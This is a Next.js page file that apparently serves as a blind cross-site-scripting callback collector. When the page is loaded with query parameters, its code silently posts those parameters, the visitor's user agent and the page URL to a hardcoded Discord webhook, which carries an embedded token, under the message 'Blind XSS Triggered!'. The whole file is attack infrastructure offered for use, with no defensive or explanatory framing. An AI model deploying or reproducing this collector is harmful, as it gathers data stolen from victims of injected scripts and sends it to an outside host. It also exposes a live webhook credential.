// pages/index.js

export async function getServerSideProps(context) {
  const data = context.query || null;

  return {
    props: { data },
  };
}

export default function Home({ data }) {
  if (typeof window !== "undefined" && data && Object.keys(data).length > 0) {
    fetch("https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `📢 Blind XSS Triggered!\nData: ${JSON.stringify(data)}\nUser-Agent: ${navigator.userAgent}\nURL: ${window.location.href}`,
      }),
    }).catch(() => {});
  }

  return (
    <div style={{
      display: "flex",
      height: "100vh",
      backgroundColor: "#0f0f0f",
      color: "#ffffff",
      justifyContent: "center",
      alignItems: "center",
      flexDirection: "column",
      fontFamily: "monospace",
      textAlign: "center"
    }}>
      <h1 style={{ fontSize: "2.5rem", marginBottom: "1rem" }}>
        One payload. One shot. One log.
      </h1>
      <p>All requests are being monitored silently...</p>
    </div>
  );
}
